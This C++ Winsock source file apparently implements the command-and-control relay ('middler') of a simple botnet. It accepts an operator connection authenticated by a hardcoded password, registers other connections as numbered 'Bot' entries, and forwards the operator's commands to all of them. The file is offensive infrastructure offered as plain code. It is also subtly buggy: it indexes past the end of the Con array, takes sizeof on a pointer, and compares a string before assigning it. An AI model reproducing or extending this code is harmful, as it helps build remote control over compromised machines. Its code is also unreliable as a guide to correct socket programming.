#include <iostream>
#include <WinSock2.h>
#include <string>
#include <cstring>

#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable: 4996)

using namespace std;

SOCKET Cli,sock, sListen, Con[256];
SOCKADDR_IN addr;

HANDLE hThread, hThreadB, hThreadC;
DWORD IDThread;

int hr;

char msg[40];
int s = sizeof(addr);


void Wsa()
{
	WSADATA wsaData;
	WORD DLLVersin = MAKEWORD(1, 2);
	WSAStartup(DLLVersin, &wsaData);

}

void setaddr()
{
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(9901);
	addr.sin_family = AF_INET;
}

void listen()
{
	sListen = socket(AF_INET, SOCK_STREAM, NULL);
	bind(sListen, (SOCKADDR*)&addr, sizeof(addr));
	listen(sListen, SOMAXCONN);
}

void setn(char msg[40])
{
	for (int i = 0; i <= 256; i++)
	{
		cout << i << "=" << msg << endl;
		if (send(Con[i], msg, sizeof(msg), NULL) == SOCKET_ERROR)
		{
			cout << "send failed" << endl;
		}
		Sleep(100);
		if (closesocket(Con[i]) == 0)
		{
			GetLastError();
		}
		
	}
	
}

DWORD WINAPI reces(LPVOID d);

DWORD WINAPI inff(LPVOID g)
{

	char msg2[40] = " ";
	string gg;
	int d = 0;
	while (true)
	{
		cout << "1" << endl;
		Sleep(100);
		sock = accept(sListen, (SOCKADDR*)&addr, &s);
		if (sock == INVALID_SOCKET)
		{
			cout << "Error of socket" << endl;
			return 0;
		}
		cout << "2" << endl;
		recv(sock, msg2, sizeof(msg2), NULL);
		cout << msg2 << 3 << endl;
		//memcpy(gg, msg2, sizeof(msg2));
		gg = msg2;
		if (gg == "v86[wmxFBdX#5nb)rR@}MSzcu>ZC{j")
		{
			Cli = sock;
			cout << "4" << endl;;
			cout << "Client connected" << endl;
			hThreadB = CreateThread(NULL, NULL, reces, NULL, NULL, &IDThread);
		}
		if (gg == "m")
		{
			Con[d] = sock; d++;
			cout << "Bot" << d << " connected to middler." << endl; cout << "5" << endl;
			
		}
		if (d == 256) { d = 1; }
		
	}

	return 0;
}

DWORD WINAPI reces(LPVOID d)
{
	int iResult(0);
	t7:
	char msg [40] = "Ready to new command";
	string m;
	cout << msg << endl;
	iResult = recv(Cli, msg, sizeof(msg), NULL);
	if (iResult < 0)
	{
		cout << "Recv failed" << endl;
		goto t7;
		return 0;
	}
	if (iResult == 0)
	{
		cout << "Client Disconnected" << endl;
		return 0;
	}

	if (m == "pong") { send(Cli, msg, sizeof(msg), NULL); goto t7; }

	else
	{
		m = msg;
		if (m == "ping" || m == "12")
		{
			setn(msg);
		}
		goto t7;
	}

	return 0;
}

int main()
{
	setlocale(LC_ALL, "russian");


	Wsa();
	setaddr();
	listen();
	hThread = CreateThread(NULL, NULL, inff, NULL, NULL, &IDThread);

	
	WaitForSingleObject(hThread, INFINITE);
	WaitForSingleObject(hThreadB, INFINITE);

	return 0;
}
